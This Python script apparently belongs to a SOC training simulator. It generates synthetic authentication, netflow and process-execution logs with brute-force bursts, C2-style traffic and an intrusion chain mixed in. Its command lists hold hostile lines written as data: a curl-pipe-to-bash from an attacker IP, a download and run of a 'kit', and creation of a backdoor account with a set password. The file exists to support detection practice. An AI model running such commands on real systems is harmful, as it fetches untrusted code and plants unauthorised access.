from __future__ import annotations

import argparse
import json
import random
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Dict, Iterable, List, Tuple

from soclsim.utils.time import to_iso_utc


@dataclass(frozen=True)
class GenConfig:
    days: int
    seed: int
    org_name: str = "ExampleCo"


NORMAL_USERS = ["alice", "bob", "carol", "dave", "erin", "frank"]
ADMIN_USERS = ["svc_backup", "svc_deploy"]
ALL_USERS = NORMAL_USERS + ADMIN_USERS

INTERNAL_SUBNETS = ["10.0.1.", "10.0.2.", "10.0.3."]
VPN_EGRESS_IPS = ["198.51.100.10", "198.51.100.11"]
ATTACKER_IPS = ["203.0.113.10", "203.0.113.77", "45.133.2.9"]

COMMON_COMMANDS = [
    "ls",
    "cd",
    "cat /var/log/auth.log",
    "systemctl status ssh",
    "ps aux",
    "whoami",
    "ip a",
]
RARE_COMMANDS = [
    "curl http://203.0.113.77/payload.sh | bash",  # downloader
    "wget http://45.133.2.9/kit.tar.gz -O /tmp/kit.tgz",
    "chmod +x /tmp/kit && /tmp/kit --install",
    "sudo useradd -m backup2 && echo 'backup2:Passw0rd!' | chpasswd",
    "ssh -o StrictHostKeyChecking=no root@10.0.3.12",
]

DEST_PORTS_COMMON = [22, 80, 443, 53, 123, 3389]
DEST_PORTS_RARE = [4444, 8081, 1337, 9001]


def _rand_internal_ip(rng: random.Random) -> str:
    base = rng.choice(INTERNAL_SUBNETS)
    return f"{base}{rng.randint(2, 250)}"


def _rand_hour_for_user(rng: random.Random, user: str) -> int:
    # Simulate human-ish behavior: users have typical working hours; svc accounts are off-hours.
    if user in ADMIN_USERS:
        return rng.choice([0, 1, 2, 3, 4, 22, 23])
    return int(min(23, max(0, rng.gauss(10.5, 2.5))))


def _ts_range(cfg: GenConfig) -> Tuple[datetime, datetime]:
    now = datetime.now(timezone.utc)
    start = (now - timedelta(days=cfg.days)).replace(minute=0, second=0, microsecond=0)
    end = now.replace(microsecond=0)
    return start, end


def gen_auth_events(cfg: GenConfig) -> Iterable[Dict]:
    rng = random.Random(cfg.seed)
    start, end = _ts_range(cfg)

    ts = start
    while ts < end:
        # background normal auth traffic
        for _ in range(rng.randint(8, 20)):
            user = rng.choice(ALL_USERS)
            ip = rng.choice(VPN_EGRESS_IPS) if rng.random() < 0.7 else _rand_internal_ip(rng)
            hour = _rand_hour_for_user(rng, user)
            event_ts = ts.replace(hour=hour) + timedelta(minutes=rng.randint(0, 59), seconds=rng.randint(0, 59))
            ok = rng.random() > (0.08 if user in NORMAL_USERS else 0.03)
            yield {
                "ts": to_iso_utc(event_ts),
                "event": "login_success" if ok else "login_failure",
                "user": user,
                "ip": ip,
                "method": "password" if rng.random() < 0.85 else "ssh_key",
                "reason": None if ok else rng.choice(["bad_password", "locked", "mfa_failed"]),
                "host": rng.choice(["vpn01", "auth01", "bastion01"]),
                "app": rng.choice(["ssh", "vpn", "sso"]),
            }

        # brute force burst from attacker (realistic scenario)
        if rng.random() < 0.12:
            victim = rng.choice(NORMAL_USERS)
            attacker_ip = rng.choice(ATTACKER_IPS)
            base = ts.replace(hour=rng.choice([1, 2, 3, 4])) + timedelta(minutes=rng.randint(0, 50))
            for i in range(rng.randint(25, 60)):
                yield {
                    "ts": to_iso_utc(base + timedelta(seconds=15 * i)),
                    "event": "login_failure",
                    "user": victim,
                    "ip": attacker_ip,
                    "method": "password",
                    "reason": "bad_password",
                    "host": "vpn01",
                    "app": "vpn",
                }
            # sometimes a success follows (password spray / guessed credential)
            if rng.random() < 0.35:
                yield {
                    "ts": to_iso_utc(base + timedelta(seconds=15 * (i + 2))),
                    "event": "login_success",
                    "user": victim,
                    "ip": attacker_ip,
                    "method": "password",
                    "reason": None,
                    "host": "vpn01",
                    "app": "vpn",
                }

        ts += timedelta(hours=6)


def gen_network_events(cfg: GenConfig) -> Iterable[Dict]:
    rng = random.Random(cfg.seed + 1)
    start, end = _ts_range(cfg)

    ts = start
    while ts < end:
        for _ in range(rng.randint(40, 120)):
            src_ip = _rand_internal_ip(rng) if rng.random() < 0.85 else rng.choice(ATTACKER_IPS)
            dst_ip = _rand_internal_ip(rng)
            port = rng.choice(DEST_PORTS_COMMON)
            proto = "tcp" if port not in [53, 123] else "udp"
            action = "allow" if rng.random() < 0.96 else "deny"
            event_ts = ts + timedelta(minutes=rng.randint(0, 359), seconds=rng.randint(0, 59))
            yield {
                "ts": to_iso_utc(event_ts),
                "event": "netflow",
                "src_ip": src_ip,
                "dst_ip": dst_ip,
                "dst_port": port,
                "proto": proto,
                "bytes": int(max(0, rng.gauss(55_000, 30_000))),
                "action": action,
                "sensor": rng.choice(["fw-edge", "fw-dc", "ids01"]),
            }

        # occasional C2-ish uncommon port to external IP
        if rng.random() < 0.10:
            src_ip = _rand_internal_ip(rng)
            dst_ip = rng.choice(ATTACKER_IPS)
            port = rng.choice(DEST_PORTS_RARE)
            base = ts.replace(hour=rng.choice([0, 1, 2, 3, 4, 22, 23])) + timedelta(minutes=rng.randint(0, 55))
            for i in range(rng.randint(8, 20)):
                yield {
                    "ts": to_iso_utc(base + timedelta(minutes=i)),
                    "event": "netflow",
                    "src_ip": src_ip,
                    "dst_ip": dst_ip,
                    "dst_port": port,
                    "proto": "tcp",
                    "bytes": int(max(1000, rng.gauss(120_000, 60_000))),
                    "action": "allow",
                    "sensor": "fw-edge",
                }

        ts += timedelta(hours=3)


def gen_process_events(cfg: GenConfig) -> Iterable[Dict]:
    rng = random.Random(cfg.seed + 2)
    start, end = _ts_range(cfg)

    hosts = ["app01", "app02", "db01", "bastion01", "ci01", "files01"]

    ts = start
    while ts < end:
        for _ in range(rng.randint(25, 80)):
            user = rng.choice(ALL_USERS)
            ip = rng.choice(VPN_EGRESS_IPS) if rng.random() < 0.6 else _rand_internal_ip(rng)
            cmd = rng.choice(COMMON_COMMANDS)
            if user in ADMIN_USERS and rng.random() < 0.10:
                cmd = rng.choice(RARE_COMMANDS + COMMON_COMMANDS)
            event_ts = ts + timedelta(minutes=rng.randint(0, 239), seconds=rng.randint(0, 59))
            yield {
                "ts": to_iso_utc(event_ts),
                "event": "process_exec",
                "user": user,
                "ip": ip,
                "host": rng.choice(hosts),
                "command": cmd,
                "parent": rng.choice(["sshd", "bash", "systemd", "cron"]),
            }

        # simulated intrusion chain: after suspicious login, attacker runs rare commands
        if rng.random() < 0.10:
            victim = rng.choice(NORMAL_USERS)
            attacker_ip = rng.choice(ATTACKER_IPS)
            host = rng.choice(["bastion01", "app01"])
            base = ts.replace(hour=rng.choice([1, 2, 3])) + timedelta(minutes=rng.randint(0, 55))
            chain = [
                "whoami",
                "id",
                "uname -a",
                "curl http://203.0.113.77/payload.sh | bash",
                "chmod +x /tmp/kit && /tmp/kit --install",
                "sudo useradd -m backup2 && echo 'backup2:Passw0rd!' | chpasswd",
            ]
            for i, cmd in enumerate(chain):
                yield {
                    "ts": to_iso_utc(base + timedelta(minutes=2 * i)),
                    "event": "process_exec",
                    "user": victim,
                    "ip": attacker_ip,
                    "host": host,
                    "command": cmd,
                    "parent": "bash",
                }

        ts += timedelta(hours=4)


def write_ndjson(path: Path, events: Iterable[Dict]) -> int:
    path.parent.mkdir(parents=True, exist_ok=True)
    n = 0
    with path.open("w", encoding="utf-8") as f:
        for e in events:
            f.write(json.dumps(e))
            f.write("\n")
            n += 1
    return n


def main(argv: List[str] | None = None) -> int:
    p = argparse.ArgumentParser(description="Generate realistic SOC log datasets (NDJSON).")
    p.add_argument("--out", required=True, help="Output directory, e.g. data/raw")
    p.add_argument("--days", type=int, default=7)
    p.add_argument("--seed", type=int, default=7)
    args = p.parse_args(argv)

    cfg = GenConfig(days=args.days, seed=args.seed)
    out = Path(args.out)

    n1 = write_ndjson(out / "auth.ndjson", gen_auth_events(cfg))
    n2 = write_ndjson(out / "network.ndjson", gen_network_events(cfg))
    n3 = write_ndjson(out / "process.ndjson", gen_process_events(cfg))
    print(f"Wrote auth={n1}, network={n2}, process={n3} events to {out}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())


